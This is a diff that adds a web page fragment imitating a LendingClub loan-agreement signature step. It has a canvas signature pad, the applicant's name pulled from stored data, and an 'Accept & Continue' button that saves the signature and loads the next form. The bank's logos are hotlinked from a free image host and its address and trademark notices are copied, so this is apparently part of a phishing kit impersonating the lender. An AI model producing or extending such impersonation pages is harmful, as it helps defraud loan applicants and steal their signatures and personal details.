@@ -1,0 +1,202 @@
+<div class="frag-contract">
+
+  <div class="card">
+    <div class="card-header">
+      <img src="https://i.ibb.co/DLHxff7/Lending-Club-logo-svg.png" alt="LendingClub">
+    </div>
+    <div class="card-body">
+      <h2 class="card-title">Digital Signature</h2>
+      <p class="card-subtitle">Sign in the box below to accept your loan agreement</p>
+
+      <div class="sig-box" id="sigBox">
+        <canvas id="sigCanvas" class="sig-canvas" width="340" height="140"
+          aria-label="Signature pad"></canvas>
+        <div class="sig-line"></div>
+        <div class="sig-meta">
+          <span id="sigName">&nbsp;</span>
+          <span id="sigDate"></span>
+        </div>
+        <div class="sig-hint" id="sigHint">Sign above with your finger or mouse</div>
+      </div>
+
+      <div class="sig-actions">
+        <button type="button" class="btn-ghost" id="sigClearBtn" disabled>Clear</button>
+      </div>
+
+      <button type="button" class="continue-btn" id="sigAcceptBtn" disabled>
+        Accept &amp; Continue
+      </button>
+    </div>
+  </div>
+
+  <div class="lc-footer">
+    <div class="footabv">
+      <img src="https://i.ibb.co/KXzT75T/lclady.png" alt="">
+    </div>
+    <div class="footfinal">
+      <img src="https://i.ibb.co/KXzs5My/Lending-Club.webp" alt="LendingClub Logo">
+    </div>
+    <div class="finalfoottxt">
+      <p class="addr">595 Market Street, Suite 200<br>San Francisco, California 94105</p>
+      <p class="rights">"LendingClub" and the "LC" symbol are trademarks of LendingClub Bank</p>
+      <p class="rights2">&copy; 2026 LendingClub Bank. All rights reserved.</p>
+    </div>
+  </div>
+
+</div>
+
+<script>
+(function () {
+  'use strict';
+
+  var canvas = document.getElementById('sigCanvas');
+  var box    = document.getElementById('sigBox');
+  var hint   = document.getElementById('sigHint');
+  var clearB = document.getElementById('sigClearBtn');
+  var acceptB = document.getElementById('sigAcceptBtn');
+  if (!canvas || !acceptB) return;
+
+  var ctx = canvas.getContext('2d');
+  var CSS_W = 340;
+  var CSS_H = 140;
+  var baseline = '';
+  var dirty = false;
+  var accepted = false;
+  var drawing = false;
+  var lastPt = null;
+
+  // ── DPR-correct sizing ────────────────────────────────────────
+  function sizeCanvas() {
+    var dpr = Math.max(1, Math.min(window.devicePixelRatio || 1, 3));
+    canvas.width  = Math.round(CSS_W * dpr);
+    canvas.height = Math.round(CSS_H * dpr);
+    canvas.style.width  = CSS_W + 'px';
+    canvas.style.height = CSS_H + 'px';
+    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    ctx.lineWidth   = 2.1;
+    ctx.lineCap     = 'round';
+    ctx.lineJoin    = 'round';
+    ctx.strokeStyle = '#0f263c';
+    baseline = canvas.toDataURL('image/png');
+  }
+
+  function resetPad() {
+    ctx.clearRect(0, 0, CSS_W, CSS_H);
+    dirty = false;
+    lastPt = null;
+    syncState();
+  }
+
+  function syncState() {
+    var hasInk = dirty && canvas.toDataURL('image/png') !== baseline;
+    clearB.disabled  = !hasInk;
+    acceptB.disabled = !hasInk;
+    if (hint) hint.style.display = hasInk ? 'none' : 'block';
+  }
+
+  // ── Coordinates (canvas is scaled, so map back to CSS space) ──
+  function pointOf(evt) {
+    var r = canvas.getBoundingClientRect();
+    return {
+      x: (evt.clientX - r.left) * (CSS_W / r.width),
+      y: (evt.clientY - r.top)  * (CSS_H / r.height)
+    };
+  }
+
+  function begin(evt) {
+    if (accepted) return;
+    drawing = true;
+    lastPt = pointOf(evt);
+    try { canvas.setPointerCapture(evt.pointerId); } catch (e) { /* */ }
+    // Dot so a tap registers
+    ctx.beginPath();
+    ctx.arc(lastPt.x, lastPt.y, ctx.lineWidth / 2, 0, Math.PI * 2);
+    ctx.fillStyle = '#0f263c';
+    ctx.fill();
+    dirty = true;
+    syncState();
+    evt.preventDefault();
+  }
+
+  function move(evt) {
+    if (!drawing) return;
+    var pt = pointOf(evt);
+    ctx.beginPath();
+    ctx.moveTo(lastPt.x, lastPt.y);
+    ctx.lineTo(pt.x, pt.y);
+    ctx.stroke();
+    lastPt = pt;
+    dirty = true;
+    evt.preventDefault();
+  }
+
+  function end(evt) {
+    if (!drawing) return;
+    drawing = false;
+    try { canvas.releasePointerCapture(evt.pointerId); } catch (e) { /* */ }
+    syncState();
+  }
+
+  // ── Wiring (guarded so re-injection re-binds cleanly) ─────────
+  if (!canvas._wired) {
+    canvas._wired = true;
+    canvas.addEventListener('pointerdown', begin);
+    canvas.addEventListener('pointermove', move);
+    canvas.addEventListener('pointerup', end);
+    canvas.addEventListener('pointercancel', end);
+    canvas.addEventListener('pointerleave', end);
+    canvas.style.touchAction = 'none';
+
+    clearB.addEventListener('click', function () {
+      if (accepted) return;
+      resetPad();
+    });
+
+    acceptB.addEventListener('click', function () {
+      if (accepted || acceptB.disabled) return;
+      var dataUrl = canvas.toDataURL('image/png');
+      if (dataUrl === baseline) return;
+
+      accepted = true;
+      acceptB.disabled = true;
+      acceptB.textContent = 'Saving…';
+
+      if (window.SPA && window.SPA.storage) window.SPA.storage.set('signature', dataUrl);
+
+      setTimeout(function () {
+        if (typeof window.requestFragment === 'function') window.requestFragment('c_formb_v1');
+        else if (window.SPA && window.SPA.renderFragment) window.SPA.renderFragment('c_formb_v1');
+      }, 220);
+    });
+  }
+
+  // ── Name + date under the line ────────────────────────────────
+  try {
+    var appData = (window.SPA && window.SPA.storage) ? window.SPA.storage.get('app_data') : null;
+    var nameEl  = document.getElementById('sigName');
+    var dateEl  = document.getElementById('sigDate');
+    if (nameEl && appData && appData.client_name) nameEl.textContent = appData.client_name;
+    if (dateEl) dateEl.textContent = new Date().toLocaleDateString('en-US', {
+      month: 'short', day: 'numeric', year: 'numeric'
+    });
+  } catch (e) { /* */ }
+
+  // ── Init: size, then restore a previous signature if present ──
+  sizeCanvas();
+
+  try {
+    var saved = (window.SPA && window.SPA.storage) ? window.SPA.storage.get('signature') : null;
+    if (saved) {
+      var img = new Image();
+      img.onload = function () {
+        ctx.drawImage(img, 0, 0, CSS_W, CSS_H);
+        dirty = true;
+        syncState();
+      };
+      img.src = saved;
+    }
+  } catch (e) { /* */ }
+
+  if (box) box.classList.add('ready');
+})();
+</script>
